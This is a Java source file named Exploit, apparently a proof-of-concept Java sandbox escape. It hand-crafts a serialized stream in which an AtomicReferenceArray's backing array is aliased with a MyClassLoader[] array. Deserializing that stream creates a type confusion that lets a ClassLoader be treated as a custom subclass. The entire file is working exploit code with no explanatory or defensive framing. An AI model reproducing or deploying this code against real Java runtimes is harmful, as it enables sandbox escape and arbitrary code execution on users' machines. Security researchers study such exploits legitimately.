import java.util.concurrent.atomic.*;
import java.io.*;

public class Exploit {
    public static MyClassLoader typeConfuse(ClassLoader loader)  {
        Serializer s = new Serializer(200);
       
        // Magic bytes and version
        s.initialize();

        // Begin an Object[]
        s.beginArray();
        s.beginClass();
        
        ObjectStreamClass objectArray = ObjectStreamClass.lookup(Object[].class);
        
        s.setLength((short)(objectArray.getName().length()));
        s.setName(objectArray.getName());
        s.setSVUID(objectArray.getSerialVersionUID());
        s.setFlags((byte)0x2);
        s.setNumFields((short)0x0);
        s.endBlockData();
        s.noSuperClassLeft();
        
        s.setLength(0x2);
        
        /* First element of array */
        /* An array of MyClassLoader */
        s.beginArray();
        s.beginClass();
        
        ObjectStreamClass myClassLoader = ObjectStreamClass.lookup(MyClassLoader[].class);
       
        s.setLength((short)myClassLoader.getName().length());
        s.setName(myClassLoader.getName());
        s.setSVUID(myClassLoader.getSerialVersionUID());
        s.setFlags((byte)0x2);
        s.setNumFields((short)0x0);
        s.endBlockData();
        s.noSuperClassLeft();
        
        s.setLength(0x1);
        s.setNull();
        
        /* Second element of array */
        s.beginObject();
        s.beginClass();
        ObjectStreamClass atomicReferenceArray = ObjectStreamClass.lookup(AtomicReferenceArray.class);
        
        s.setLength((short)(atomicReferenceArray.getName().length()));
        s.setName(atomicReferenceArray.getName());
        s.setSVUID(atomicReferenceArray.getSerialVersionUID());
        s.setFlags((byte)0x2);
        s.setNumFields((short)0x1);
        
        s.beginArrayType();
        s.setLength((short)("array".length()));
        s.setName("array");
        s.beginString();
        s.setLength((short)objectArray.getName().length());
        s.setName(objectArray.getName());
        s.endBlockData();
        s.noSuperClassLeft();
        
        s.beginObjectReference();
        s.setReference(0x7e0003);
        
        //s.debug();
        
        Object[] objs = (Object [])s.deserialize();
        
        MyClassLoader[] myClassLoaderObjs = (MyClassLoader[])objs[0];
        AtomicReferenceArray ara = (AtomicReferenceArray)objs[1];
        
        ara.set(0, loader);
        System.out.println(myClassLoaderObjs[0]);
        return myClassLoaderObjs[0];
    }
}